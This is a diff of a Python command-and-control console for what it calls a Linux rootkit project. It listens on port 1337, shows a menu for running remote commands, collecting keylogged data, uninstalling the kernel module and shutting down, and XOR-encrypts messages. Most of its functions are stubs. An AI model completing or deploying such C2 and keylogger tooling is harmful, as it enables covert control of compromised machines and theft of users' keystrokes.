@@ -6,89 +6,109 @@ Created on Fri Nov  1 12:07:20 2019
 
 Linux Rootkit Project
 
-	C2 Command Line Interface
-	"""
-	
-import socket
-import sys
-from ctypes import *
+C2 Command Line Interface
+"""
 
-"""TLV c-like struct"""
-class tvl(Structure):
-	fields = [("type", c_uint32), ("length", c_uint32), ("value", c_void_p)]
-	
-def execute():
-	return "This will execute a command"
-	
-def gather():
-	return "This will gather keylogged commands"
-def uninstall():
-	return "This will unistall the kernel module"
-def shutdown():
-	return "This will shutdown the C2"	
-def printMenu():
-print(
-			"""
-	######                                        #     #
-	#     #  ####   ####  ##### #    # # #####    ##   ## ###### #    # #    #
-	#     # #    # #    #   #   #   #  #   #      # # # # #      ##   # #    #
-	######  #    # #    #   #   ####   #   #      #  #  # #####  # #  # #    #
-	#   #   #    # #    #   #   #  #   #   #      #     # #      #  # # #    #
-	#    #  #    # #    #   #   #   #  #   #      #     # #      #   ## #    #
-	#     #  ####   ####    #   #    # #   #      #     # ###### #    #  ####                        
-						1: Execute Command
-						2: Collect Data
-						3: Uninstall
-						4: Shutdown
-			"""
-		)
-		
-def convertTLV():
-	return "Converting to TLV..."
-def unconvertTLV():
-	return "Converting from TLV..."
-def encrypt():
-	return "Encrypting the message..."
-def send():
-	return "Sending data..."
-def wait():
-	return "Waiting..."
-def saveData():
-	return "Data saved to file: ..."
-def numbers_to_menu_options(choice):
-	"""switcher = {
-		1: execute(),
-		2: gather(),
-		3: uninstall(),
-		4: shutdown(),
-		}
-	func = switcher.get(choice, lambda: "Invalid Choice")
-	func()"""
-def main():
-	while True:
-		printMenu()
-		menuOpt = int(input("Enter menu choice 1 - 4: "))        
-		if menuOpt == 1:
-			commandStr = str(input("Enter command to execute: "))
-			commandArr = bytearray(commandStr, 'utf-8')
-			commandSize = len(commandArr)
-			commandArr.insert(0, commandSize)
-			commandArr.insert(0, 1);
-			print(commandArr)
-			#send command packet
-		elif menuOpt == 2:
-			gatherCommand = bytearray(b'\x02\x00')
-			print(gatherCommand)
-			#send gather command
-		elif menuOpt == 3:
-			uninstallCommand = bytearray(b'\x03\x00')
-			print(uninstallCommand)
-			#send uninstall command
-			break
-		elif menuOpt == 4:
-			shutdownCommand = bytearray(b'\x04\x00')
-			print(shutdownCommand)
-			#send shutdown command
-			break
-			
-main()
+import socket
+import binascii
+import sys
+
+def print_menu():
+    print(
+            """
+######                                        #     #                      
+#     #  ####   ####  ##### #    # # #####    ##   ## ###### #    # #    #
+#     # #    # #    #   #   #   #  #   #      # # # # #      ##   # #    #
+######  #    # #    #   #   ####   #   #      #  #  # #####  # #  # #    #
+#   #   #    # #    #   #   #  #   #   #      #     # #      #  # # #    #
+#    #  #    # #    #   #   #   #  #   #      #     # #      #   ## #    # 
+#     #  ####   ####    #   #    # #   #      #     # ###### #    #  #### 
+            
+                        1: Execute Command
+                        2: Collect Data
+                        3: Uninstall
+                        4: Shutdown
+            """
+        )
+
+def execute(socket):
+    return "This will execute a command"
+
+def collect(socket):
+    return "This will gather keylogged commands"
+
+def uninstall(socket):
+    return "This will unistall the kernel module"
+
+def shutdown(socket):
+    return "This will shutdown the C2"
+
+def numbers_to_menu_options(choice, socket):
+    switcher = {
+            1: execute(socket),
+            2: collect(socket),
+            3: uninstall(socket),
+            4: shutdown(socket),
+            }
+    func = switcher.get(choice, lambda: "Invalid Choice")
+    print(func)
+    
+def encrypt(message, key):
+    byte_list = [bytes(message[i:i+4]) for i in range(0, len(message)-3, 4)]
+    int_list = [int.from_bytes(byte_list[i]) for i in range(len(byte_list))]
+
+    for i in range(len(int_list)):
+        int_list[i] ^= int.from_bytes(key)
+        byte_list[i] = int_list[i].to_bytes(4)
+
+    return b''.join(byte_list)
+
+def to_TLV(message): 
+    print("Converting to TLV...")
+    return message
+
+def from_TLV(message):
+    
+    message = "\x01\x07\x00\x00\x00\x6c\x73\x20\x2f\x74\x6d\x70".encode()
+    my_array = []
+    
+    for i in range (len(message)):
+        string = message[i]
+        my_array.append(string)
+
+def send(message):
+    print("Sending data...")
+
+def save_data(message):
+    print("Data saved to file: ...")
+    print(f"Your message was: {message}")
+
+
+# Main
+if __name__ == "__main__":
+    
+    # create a socket object
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    print("Socket created, binding to port...")
+    
+    #reserve port 1337
+    port =  1337
+    
+    # Bind to the port, input empty string for ip
+    s.bind(('', port))
+    print (f"Socket bound to {port} successfully, waiting for response...")
+    
+    s.listen(5)
+    
+    while True:
+         # Establish connection with client
+         c, addr = s.accept()
+         print (f"Connection from {addr} accepted.  Awaiting commands...")
+         # Print the menu once before the Menu Loop
+         print_menu() 
+         while True:
+             i = int(input("Enter menu choice 1 - 4: "))
+             numbers_to_menu_options(i, c)
+             if i == 3 or i == 4:
+                 break
+         break
